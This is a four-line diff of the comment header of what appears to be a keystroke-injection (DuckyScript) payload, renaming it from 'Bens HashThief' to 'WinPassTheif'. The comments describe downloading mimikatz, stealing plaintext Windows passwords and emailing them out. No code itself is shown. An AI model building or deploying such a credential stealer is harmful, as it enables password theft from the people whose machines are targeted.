@@ -1,4 +1,4 @@
-REM Title: Bens HashThief
+REM Title: WinPassTheif
 REM Note: Adjust delays to match host DL & CPU speed
 REM Downloads mimikatz, runs it to steal plaintext passwords
 REM Passwords are then emailed to you!
